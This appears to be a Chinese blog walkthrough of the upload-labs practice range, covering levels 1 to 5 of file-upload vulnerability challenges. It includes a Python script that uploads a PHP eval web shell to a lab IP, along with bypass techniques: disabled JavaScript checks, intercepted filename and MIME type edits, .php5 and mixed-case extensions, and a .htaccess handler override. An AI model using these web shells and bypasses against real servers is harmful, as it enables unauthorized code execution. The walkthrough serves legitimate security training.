---
title: 'Upload Labs 攻略'
date: '2025-04-28T17:02:52+08:00'
weight: 
draft: false
description: 'Upload Labs 攻略'
---

## upload-labs 简介

upload-labs 是一个使用 php 语言编写的，专门收集渗透测试和 CTF 中遇到的各种上传漏洞的靶场，旨在帮助大家对上传漏洞有一个全面的了解，目前一共 20 关，每一关都包含着不同上传方式。

**注意：**

1. 每一关没有固定的通关方法，大家不要自限思维！

2. 本项目提供的writeup只是起一个参考作用，希望大家可以分享出自己的通关思路。

3. 实在没有思路时，可以点击查看提示。

4. 如果黑盒情况下，实在做不出，可以点击查看源码。

**后续:**

如在渗透测试实战中遇到新的上传漏洞类型，会更新到 upload-labs 中。当然如果你也希望参加到这个工作当中，欢迎 pull requests 给我!

项目地址：https://github.com/c0ny1/upload-labs

## Pass-01

尝试上传 `fish.php`，提示只能上传 `.jpg|.png|.gif` 类型的文件

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_18-58-11.73u5gkyjm9.png)

上传文件后抓包失败，考虑是否为客户端 `JavaScript` 检查，检查页面元素发现 `JavaScript` 内容

```javascript
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name) == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

**1、禁用 JavaScript**

使用扩展 `Disable JavaScript` 禁用 JavaScript 后直接上传 `fish.php`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_19-49-06.77drecl2w4.webp)

**2、requests 请求模拟**

使用 Python 的 `requests` 模块进行模拟请求，绕过客户端检查

```python
import requests

url = "http://192.168.126.129/upload-labs-0.1/Pass-01/index.php"

files = {
    'upload_file': ('fish.php', '<?php @eval($_POST[\'fish\']) ?>')
}

data = {
    'submit': '上传'
}

headers = {
    'Referer': 'http://192.168.126.129/upload-labs-0.1/Pass-01/index.php',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0',
    'Origin': 'http://192.168.126.129',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
}

response = requests.post(url, headers=headers, files=files, data=data)

with open('response_text/upload-labs-less01.html', 'w', encoding='utf-8') as f:
    f.write(response.text)

print('Success')
```

**3、劫持请求修改文件后缀**

将 `fish.php` 的后缀名修改为 `.jpg` 进行上传，绕过客户端检查后劫持请求，将 `filename=fish.jpg` 修改为 `filename=fish.php`

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_19-42-23.9kgdvjq8af.webp)

**4、复制 html 到本地修改**

将整个 `html` 代码复制到本地，删除 `javascript` 部分的内容，为 `form` 添加 `action` 属性（表单提交数据的目标地址），直接提交 `fish.php`

```html
<form action="http://192.168.126.129/upload-labs-0.1/Pass-01/index.php" enctype="multipart/form-data" method="post" onsubmit="return checkFile()">
  <p>请选择要上传的图片：</p>
  <p>
    <input class="input_file" type="file" name="upload_file">
    <input class="button" type="submit" name="submit" value="上传"></p>
</form>
```

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_20-18-32.7zqmw43lx8.webp)

## Pass-02

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 提示“文件类型不正确，请重新上传”，判断为 **白名单** 类型

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_23-01-47.8vn4bq7eb0.webp)

**尝试 `MIME` 绕过**

MIME (Multipurpose Internet Mail Extensions) 多用途互联网邮件扩展是一种标准，用来表示文档、文件或一组数据的性质和格式。

通用结构：`type/subtype`

|     类型      |  描述   |                            示例                            |
|:-----------:|:-----:|:--------------------------------------------------------:|
|    text     | 普通文本  | `text/plain`, `text/html`, `text/css`, `text/javascript` |
|    image    |  图像   |          `image/gif`, `image/png`, `image/jpeg`          |
| application | 二进制数据 |  `application/x-httpd-php`, `application/octet-stream`   |

上传 `fish.php`，劫持请求

![](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-43-52.3d4zwkrufq.webp)

将 `Content-Type` 从 `application/octet-stream` 修改为 `image/jpeg`

![PixPin_2025-04-29_15-47-15](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-47-15.969y5vjei5.webp)

上传成功

![PixPin_2025-04-29_15-52-20](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_15-52-20.8hgolv2k6w.webp)

## Pass-03

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

**尝试上传特殊可解析后缀**

将 `fish.php` 的后缀名修改为 `.php5` 进行上传，上传成功

![PixPin_2025-04-29_17-30-42](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-30-42.3goluegrq7.webp)

> [!WARNING]
> 这里使用蚁剑进行连接出现连接失败，经过多次尝试发现这里需要 `php-5.4.45` 的环境，并且需要将 Apache 配置文件 `httpd-conf` 的 `403` 行 `#AddType application/x-httpd-php .php .phtml` 修改为 `AddType application/x-httpd-php .php .phtml .php1 .php2 .php3 .php4 .php5 .pht`，使服务器可以正常将这些后缀名的文件解析为 `php`。

## Pass-04

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

上传特殊可解析后缀 `fish.php5` 提示“此文件不允许上传”

![PixPin_2025-04-29_17-49-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-49-51.8z6qakaxdl.webp)

**尝试上传 `.htaccess`**

前面 `fish.jpg` 上传成功，但访问时服务器会将它解析为一个图片，提示“图像因存在错误而无法显示”

`.htaccess` 是一个配置文件，用于 Apache 服务器的目录级配置，它允许为特定的目录或文件定义服务器配置，而不需要修改 Apache 的主配置文件。

新建 `.htaccess` 文件并添加以下内容，使服务器可以将 `fish.jpg` 解析为 `php` 文件

```text {filename=".htaccess"}
<FilesMatch "fish.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>
```

上传 `.htaccess`

![PixPin_2025-04-29_17-59-07](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-59-07.2yyk5udqav.webp)

> [!WARNING]
> 若上传 `.htaccess` 文件后仍然无法将 `fish.jpg` 解析为 `php` 文件，检查 Apache 的配置文件 `httpd-conf`，修改 `AllowOverride` 为 `All`，允许 `.htaccess` 文件在其目录下进行任意的配置覆盖

```text
DocumentRoot  "C:\phpStudy\WWW"
<Directory />
    Options +Indexes +FollowSymLinks +ExecCGI
    AllowOverride All
    Order allow,deny
    Allow from all
    Require all granted
</Directory>
```

访问 `fish.jpg` 不再提示“图像因存在错误而无法显示”，使用蚁剑成功连接

![PixPin_2025-04-29_18-00-48](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_18-00-48.6bha07w2o2.webp)

## Pass-05

排除客户端 `JavaScript` 检查，上传非图片内容、图片后缀的文件 `fish.jpg` 成功，判断为 **检查后缀** 类型

![PixPin_2025-04-28_22-59-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp)

上传任意后缀文件 `fish.fish` 成功，判断为 **黑名单** 类型

![PixPin_2025-04-29_16-18-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp)

上传特殊可解析后缀 `fish.php5` 提示“此文件不允许上传”

![PixPin_2025-04-29_17-49-51](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-49-51.8z6qakaxdl.webp)

上传 `.htaccess` 提示“此文件类型不允许上传”

![PixPin_2025-04-29_18-58-34](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_18-58-34.4n7x33837l.webp)

**1、后缀大小写绕过**

将 `fish.php` 的后缀名修改为 `.PhP` 进行上传，上传成功

![PixPin_2025-04-29_19-02-44](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_19-02-44.6m43tfiup2.webp)

